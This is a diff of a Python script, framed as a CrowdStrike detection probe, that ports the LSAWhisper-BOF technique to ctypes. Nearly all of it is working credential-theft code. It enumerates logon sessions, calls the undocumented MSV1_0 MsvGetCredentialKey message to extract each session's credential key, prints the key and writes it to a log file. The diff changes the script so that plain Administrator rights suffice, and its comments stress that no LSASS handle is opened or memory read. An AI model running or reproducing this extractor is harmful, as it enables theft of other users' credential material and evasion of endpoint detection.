@@ -1,296 +1,195 @@
 """
 lsa_gap_test.py
-CrowdStrike Detection Surface Probe — LSAWhisper-BOF technique
-Mirrors exact API calls of LSAWhisper-BOF using ctypes.
-No compiler needed. Run directly with Python 3.
+Tests CrowdStrike detection of LSA credential key extraction.
+Works with standard Administrator — no SYSTEM/SeTcbPrivilege needed.
+Uses LsaConnectUntrusted instead of LsaRegisterLogonProcess.
 
-RUN (elevated PowerShell/CMD as Administrator):
+RUN as Administrator:
     python lsa_gap_test.py
-
-Requirements:
-    - Python 3 (any version)
-    - Windows
-    - Run as Administrator
 """
 
 import ctypes
 import ctypes.wintypes as wt
-import sys
+import sys, os, datetime
 
-# ── Types ────────────────────────────────────────────────────────────────────
+LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "lsa_gap_results.txt")
+log = open(LOG_PATH, "w", encoding="utf-8")
 
-NTSTATUS = ctypes.c_long
-STATUS_SUCCESS = 0
+def p(msg=""):
+    print(msg)
+    log.write(msg + "\n")
+    log.flush()
+
+NTSTATUS   = ctypes.c_long
+STATUS_OK  = 0
 
 class LSA_STRING(ctypes.Structure):
-    _fields_ = [
-        ("Length",        ctypes.c_ushort),
-        ("MaximumLength", ctypes.c_ushort),
-        ("Buffer",        ctypes.c_char_p),
-    ]
+    _fields_ = [("Length", ctypes.c_ushort),
+                ("MaximumLength", ctypes.c_ushort),
+                ("Buffer", ctypes.c_char_p)]
 
 class LUID(ctypes.Structure):
-    _fields_ = [
-        ("LowPart",  ctypes.c_ulong),
-        ("HighPart", ctypes.c_long),
-    ]
-
-class CREDKEY_REQUEST(ctypes.Structure):
-    _fields_ = [
-        ("MessageType", ctypes.c_ulong),   # 0x37 = MsvGetCredentialKey
-        ("LogonId",     LUID),
-    ]
-
-class CREDKEY_RESPONSE(ctypes.Structure):
-    _fields_ = [
-        ("MessageType", ctypes.c_ulong),
-        ("KeyType",     ctypes.c_ulong),   # 1=Local SHA OWF  2=Domain NT OWF
-        ("Key",         ctypes.c_ubyte * 20),
-    ]
+    _fields_ = [("LowPart", ctypes.c_ulong),
+                ("HighPart", ctypes.c_long)]
 
 class UNICODE_STRING(ctypes.Structure):
-    _fields_ = [
-        ("Length",        ctypes.c_ushort),
-        ("MaximumLength", ctypes.c_ushort),
-        ("Buffer",        ctypes.c_wchar_p),
-    ]
+    _fields_ = [("Length", ctypes.c_ushort),
+                ("MaximumLength", ctypes.c_ushort),
+                ("Buffer", ctypes.c_wchar_p)]
 
 class SESSION_DATA(ctypes.Structure):
-    _fields_ = [
-        ("Size",                   ctypes.c_ulong),
-        ("LogonId",                LUID),
-        ("UserName",               UNICODE_STRING),
-        ("LogonDomain",            UNICODE_STRING),
-        ("AuthenticationPackage",  UNICODE_STRING),
-        ("LogonType",              ctypes.c_ulong),
-        ("Session",                ctypes.c_ulong),
-        ("Sid",                    ctypes.c_void_p),
-        ("LogonTime",              ctypes.c_int64),
-        ("LogonServer",            UNICODE_STRING),
-        ("DnsDomainName",          UNICODE_STRING),
-        ("Upn",                    UNICODE_STRING),
-    ]
+    _fields_ = [("Size", ctypes.c_ulong),
+                ("LogonId", LUID),
+                ("UserName", UNICODE_STRING),
+                ("LogonDomain", UNICODE_STRING),
+                ("AuthenticationPackage", UNICODE_STRING),
+                ("LogonType", ctypes.c_ulong),
+                ("Session", ctypes.c_ulong),
+                ("Sid", ctypes.c_void_p),
+                ("LogonTime", ctypes.c_int64),
+                ("LogonServer", UNICODE_STRING),
+                ("DnsDomainName", UNICODE_STRING),
+                ("Upn", UNICODE_STRING)]
 
-# ── Load secur32.dll ─────────────────────────────────────────────────────────
+class CREDKEY_REQUEST(ctypes.Structure):
+    _fields_ = [("MessageType", ctypes.c_ulong),
+                ("LogonId", LUID)]
 
-try:
-    secur32 = ctypes.WinDLL("secur32.dll")
-except OSError as e:
-    print(f"[-] Cannot load secur32.dll: {e}")
-    sys.exit(1)
+class CREDKEY_RESPONSE(ctypes.Structure):
+    _fields_ = [("MessageType", ctypes.c_ulong),
+                ("KeyType", ctypes.c_ulong),
+                ("Key", ctypes.c_ubyte * 20)]
 
-# LsaRegisterLogonProcess
-secur32.LsaRegisterLogonProcess.restype  = NTSTATUS
-secur32.LsaRegisterLogonProcess.argtypes = [
-    ctypes.POINTER(LSA_STRING),
-    ctypes.POINTER(wt.HANDLE),
-    ctypes.POINTER(ctypes.c_ulong),
-]
+# Load secur32
+sec = ctypes.WinDLL("secur32.dll")
 
-# LsaLookupAuthenticationPackage
-secur32.LsaLookupAuthenticationPackage.restype  = NTSTATUS
-secur32.LsaLookupAuthenticationPackage.argtypes = [
-    wt.HANDLE,
-    ctypes.POINTER(LSA_STRING),
-    ctypes.POINTER(ctypes.c_ulong),
-]
+# LsaConnectUntrusted — works as normal Admin, no SeTcbPrivilege needed
+sec.LsaConnectUntrusted.restype  = NTSTATUS
+sec.LsaConnectUntrusted.argtypes = [ctypes.POINTER(wt.HANDLE)]
 
-# LsaCallAuthenticationPackage
-secur32.LsaCallAuthenticationPackage.restype  = NTSTATUS
-secur32.LsaCallAuthenticationPackage.argtypes = [
-    wt.HANDLE,
-    ctypes.c_ulong,
-    ctypes.c_void_p,
-    ctypes.c_ulong,
-    ctypes.POINTER(ctypes.c_void_p),
-    ctypes.POINTER(ctypes.c_ulong),
-    ctypes.POINTER(NTSTATUS),
-]
+sec.LsaLookupAuthenticationPackage.restype  = NTSTATUS
+sec.LsaLookupAuthenticationPackage.argtypes = [wt.HANDLE,
+    ctypes.POINTER(LSA_STRING), ctypes.POINTER(ctypes.c_ulong)]
 
-# LsaFreeReturnBuffer
-secur32.LsaFreeReturnBuffer.restype  = NTSTATUS
-secur32.LsaFreeReturnBuffer.argtypes = [ctypes.c_void_p]
+sec.LsaCallAuthenticationPackage.restype  = NTSTATUS
+sec.LsaCallAuthenticationPackage.argtypes = [wt.HANDLE, ctypes.c_ulong,
+    ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p),
+    ctypes.POINTER(ctypes.c_ulong), ctypes.POINTER(NTSTATUS)]
 
-# LsaEnumerateLogonSessions
-secur32.LsaEnumerateLogonSessions.restype  = NTSTATUS
-secur32.LsaEnumerateLogonSessions.argtypes = [
-    ctypes.POINTER(ctypes.c_ulong),
-    ctypes.POINTER(ctypes.POINTER(LUID)),
-]
+sec.LsaFreeReturnBuffer.restype  = NTSTATUS
+sec.LsaFreeReturnBuffer.argtypes = [ctypes.c_void_p]
 
-# LsaGetLogonSessionData
-secur32.LsaGetLogonSessionData.restype  = NTSTATUS
-secur32.LsaGetLogonSessionData.argtypes = [
-    ctypes.POINTER(LUID),
-    ctypes.POINTER(ctypes.POINTER(SESSION_DATA)),
-]
+sec.LsaEnumerateLogonSessions.restype  = NTSTATUS
+sec.LsaEnumerateLogonSessions.argtypes = [ctypes.POINTER(ctypes.c_ulong),
+    ctypes.POINTER(ctypes.POINTER(LUID))]
 
-# LsaDeregisterLogonProcess
-secur32.LsaDeregisterLogonProcess.restype  = NTSTATUS
-secur32.LsaDeregisterLogonProcess.argtypes = [wt.HANDLE]
+sec.LsaGetLogonSessionData.restype  = NTSTATUS
+sec.LsaGetLogonSessionData.argtypes = [ctypes.POINTER(LUID),
+    ctypes.POINTER(ctypes.POINTER(SESSION_DATA))]
 
-print("[+] secur32.dll loaded OK")
+sec.LsaDeregisterLogonProcess.restype  = NTSTATUS
+sec.LsaDeregisterLogonProcess.argtypes = [wt.HANDLE]
 
-# ── Helper ───────────────────────────────────────────────────────────────────
-
-def make_lsa_string(s: str) -> LSA_STRING:
+def lsa_str(s):
     b = s.encode("ascii")
-    ls = LSA_STRING()
-    ls.Buffer        = b
-    ls.Length        = len(b)
-    ls.MaximumLength = len(b) + 1
+    ls = LSA_STRING(); ls.Buffer = b
+    ls.Length = len(b); ls.MaximumLength = len(b)+1
     return ls
 
-# ── Core test ────────────────────────────────────────────────────────────────
+def run_test(luid):
+    handle = wt.HANDLE()
+    pkg_id = ctypes.c_ulong(0)
 
-def run_test(luid: LUID) -> bool:
-    """
-    Performs the three LSA calls that mirror LSAWhisper-BOF exactly:
-      1. LsaRegisterLogonProcess
-      2. LsaLookupAuthenticationPackage
-      3. LsaCallAuthenticationPackage (MsvGetCredentialKey = 0x37)
-    """
-
-    lsa_handle   = wt.HANDLE()
-    package_id   = ctypes.c_ulong(0)
-
-    # ── STEP 1: LsaRegisterLogonProcess ──────────────────────────────────
-    # Registers this process as an LSA trusted client.
-    # Fires Windows Security Event ID 4611 if audit policy is enabled.
-    # Requires SeTcbPrivilege (Administrator / SYSTEM).
-    print("\n[*] STEP 1: LsaRegisterLogonProcess")
-    proc_name = make_lsa_string("svcgaptest")
-    status = secur32.LsaRegisterLogonProcess(
-        ctypes.byref(proc_name),
-        ctypes.byref(lsa_handle),
-        None
-    )
-    if status != STATUS_SUCCESS:
-        print(f"    [-] FAILED: 0x{status & 0xFFFFFFFF:08X}")
-        print("         -> Must run as Administrator")
+    # STEP 1 — LsaConnectUntrusted (untrusted client, works as Admin)
+    p("[*] STEP 1: LsaConnectUntrusted")
+    st = sec.LsaConnectUntrusted(ctypes.byref(handle))
+    if st != STATUS_OK:
+        p(f"    [-] FAILED: 0x{st & 0xFFFFFFFF:08X}")
         return False
-    print(f"    [+] OK  handle=0x{lsa_handle.value:X}")
+    p(f"    [+] OK  handle=0x{handle.value:X}")
 
-    # ── STEP 2: LsaLookupAuthenticationPackage ───────────────────────────
-    # Resolves numeric ID of MSV1_0 — the package holding DPAPI keys.
-    print("[*] STEP 2: LsaLookupAuthenticationPackage (MSV1_0)")
-    pkg_name = make_lsa_string("MICROSOFT_AUTHENTICATION_PACKAGE_V1_0")
-    status = secur32.LsaLookupAuthenticationPackage(
-        lsa_handle,
-        ctypes.byref(pkg_name),
-        ctypes.byref(package_id)
-    )
-    if status != STATUS_SUCCESS:
-        print(f"    [-] FAILED: 0x{status & 0xFFFFFFFF:08X}")
-        secur32.LsaDeregisterLogonProcess(lsa_handle)
+    # STEP 2 — Resolve MSV1_0 package
+    p("[*] STEP 2: LsaLookupAuthenticationPackage (MSV1_0)")
+    n = lsa_str("MICROSOFT_AUTHENTICATION_PACKAGE_V1_0")
+    st = sec.LsaLookupAuthenticationPackage(handle, ctypes.byref(n), ctypes.byref(pkg_id))
+    if st != STATUS_OK:
+        p(f"    [-] FAILED: 0x{st & 0xFFFFFFFF:08X}")
+        sec.LsaDeregisterLogonProcess(handle)
         return False
-    print(f"    [+] OK  package_id={package_id.value}")
+    p(f"    [+] OK  package_id={pkg_id.value}")
 
-    # ── STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37) ──
-    # THE KEY CALL — identical to LSAWhisper-BOF lsa-credkey command.
-    # Sends undocumented message 0x37 to msv1_0.dll inside lsass.exe
-    # via the LSA trusted client named pipe.
-    # No handle to lsass.exe opened. No lsass memory read.
-    print("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)")
-    print(f"    LUID: 0x{luid.HighPart:08X}:0x{luid.LowPart:08X}")
+    # STEP 3 — MsvGetCredentialKey (0x37) — the LSAWhisper call
+    p("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)")
+    p(f"    LUID: 0x{luid.HighPart:X}:0x{luid.LowPart:X}")
 
-    req          = CREDKEY_REQUEST()
+    req = CREDKEY_REQUEST()
     req.MessageType = 0x37
-    req.LogonId     = luid
+    req.LogonId = luid
 
-    resp_ptr    = ctypes.c_void_p(0)
-    resp_len    = ctypes.c_ulong(0)
-    sub_status  = NTSTATUS(0)
+    resp_ptr   = ctypes.c_void_p(0)
+    resp_len   = ctypes.c_ulong(0)
+    sub_status = NTSTATUS(0)
 
-    status = secur32.LsaCallAuthenticationPackage(
-        lsa_handle,
-        package_id.value,
-        ctypes.byref(req),
-        ctypes.sizeof(req),
-        ctypes.byref(resp_ptr),
-        ctypes.byref(resp_len),
-        ctypes.byref(sub_status)
-    )
+    st = sec.LsaCallAuthenticationPackage(
+        handle, pkg_id.value,
+        ctypes.byref(req), ctypes.sizeof(req),
+        ctypes.byref(resp_ptr), ctypes.byref(resp_len),
+        ctypes.byref(sub_status))
 
-    success = False
-    if status != STATUS_SUCCESS:
-        print(f"    [-] Outer FAILED: 0x{status & 0xFFFFFFFF:08X}")
-    elif sub_status.value != STATUS_SUCCESS:
-        print(f"    [-] Inner FAILED: 0x{sub_status.value & 0xFFFFFFFF:08X}  (invalid LUID or session ended)")
+    if st != STATUS_OK:
+        p(f"    [-] Outer FAILED: 0x{st & 0xFFFFFFFF:08X}")
+    elif sub_status.value != STATUS_OK:
+        p(f"    [-] Inner FAILED: 0x{sub_status.value & 0xFFFFFFFF:08X} (session ended or access denied)")
     elif resp_ptr.value:
         resp = ctypes.cast(resp_ptr, ctypes.POINTER(CREDKEY_RESPONSE)).contents
-        key_hex = bytes(resp.Key).hex().upper()
-        print(f"    [+] OK  {resp_len.value} bytes returned")
-        print()
-        print("    ╔══════════════════════════════════════════════╗")
-        print("    ║   CREDENTIAL KEY EXTRACTED                   ║")
-        print("    ╠══════════════════════════════════════════════╣")
-        print(f"    ║   Key:     {key_hex:<34} ║")
-        print(f"    ║   KeyType: {resp.KeyType}  (1=Local SHA OWF  2=Domain NT OWF) ║")
-        print("    ╚══════════════════════════════════════════════╝")
-        secur32.LsaFreeReturnBuffer(resp_ptr)
-        success = True
+        key  = bytes(resp.Key).hex().upper()
+        p(f"    [+] OK  {resp_len.value} bytes")
+        p(f"")
+        p(f"    ╔══════════════════════════════════════╗")
+        p(f"    ║  CREDENTIAL KEY EXTRACTED            ║")
+        p(f"    ╠══════════════════════════════════════╣")
+        p(f"    ║  Key:     {key:<28} ║")
+        p(f"    ║  Type:    {resp.KeyType}  (1=Local  2=Domain)    ║")
+        p(f"    ╚══════════════════════════════════════╝")
+        sec.LsaFreeReturnBuffer(resp_ptr)
 
-    secur32.LsaDeregisterLogonProcess(lsa_handle)
-    return success
+    sec.LsaDeregisterLogonProcess(handle)
+    return st == STATUS_OK and sub_status.value == STATUS_OK
 
-# ── Enumerate all sessions ───────────────────────────────────────────────────
+def main():
+    p("=" * 50)
+    p("  LSA Gap Test — CrowdStrike Detection Probe")
+    p(f"  {datetime.datetime.now()}")
+    p("=" * 50)
+    p(f"[*] Results saved to: {LOG_PATH}")
 
-def run_all():
     count    = ctypes.c_ulong(0)
     sessions = ctypes.POINTER(LUID)()
-
-    print("\n[*] Enumerating logon sessions...")
-    status = secur32.LsaEnumerateLogonSessions(
-        ctypes.byref(count),
-        ctypes.byref(sessions)
-    )
-    if status != STATUS_SUCCESS:
-        print(f"[-] LsaEnumerateLogonSessions failed: 0x{status & 0xFFFFFFFF:08X}")
+    st = sec.LsaEnumerateLogonSessions(ctypes.byref(count), ctypes.byref(sessions))
+    if st != STATUS_OK:
+        p(f"[-] Enumerate failed: 0x{st&0xFFFFFFFF:08X}")
         return
 
-    print(f"[*] Found {count.value} sessions\n")
+    p(f"[*] Found {count.value} sessions\n")
 
     for i in range(count.value):
         data_ptr = ctypes.POINTER(SESSION_DATA)()
-        luid     = sessions[i]
-        status   = secur32.LsaGetLogonSessionData(
-            ctypes.byref(luid),
-            ctypes.byref(data_ptr)
-        )
-        if status != STATUS_SUCCESS or not data_ptr:
+        luid = sessions[i]
+        st = sec.LsaGetLogonSessionData(ctypes.byref(luid), ctypes.byref(data_ptr))
+        if st != STATUS_OK or not data_ptr:
             continue
-
         d = data_ptr.contents
-        # 2=Interactive  3=Network  5=Service
         if d.LogonType in (2, 3, 5):
-            user   = d.UserName.Buffer   or ""
+            user   = d.UserName.Buffer    or ""
             domain = d.LogonDomain.Buffer or ""
-            print(f"─── Session {i+1}/{count.value}  "
-                  f"LUID=0x{luid.LowPart:X}  "
-                  f"Type={d.LogonType}  "
-                  f"User={domain}\\{user}")
+            p(f"─── Session {i+1}/{count.value}  LUID=0x{luid.LowPart:X}  Type={d.LogonType}  {domain}\\{user}")
             run_test(luid)
-            print()
+            p("")
+        sec.LsaFreeReturnBuffer(data_ptr)
 
-        secur32.LsaFreeReturnBuffer(data_ptr)
-
-    secur32.LsaFreeReturnBuffer(sessions)
-
-# ── Main ─────────────────────────────────────────────────────────────────────
+    sec.LsaFreeReturnBuffer(sessions)
+    p("\n[*] Done. Check lsa_gap_results.txt")
+    log.close()
 
 if __name__ == "__main__":
-    print("=" * 52)
-    print("  LSA Gap Test — CrowdStrike Detection Probe")
-    print("  No LSASS handle. No memory read. No DLL.")
-    print("=" * 52)
-
-    if len(sys.argv) == 2:
-        raw  = int(sys.argv[1], 0)
-        luid = LUID()
-        luid.LowPart  = raw & 0xFFFFFFFF
-        luid.HighPart = (raw >> 32) & 0xFFFFFFFF
-        print(f"\n[*] Testing specific LUID: {sys.argv[1]}")
-        run_test(luid)
-    else:
-        run_all()
+    main()
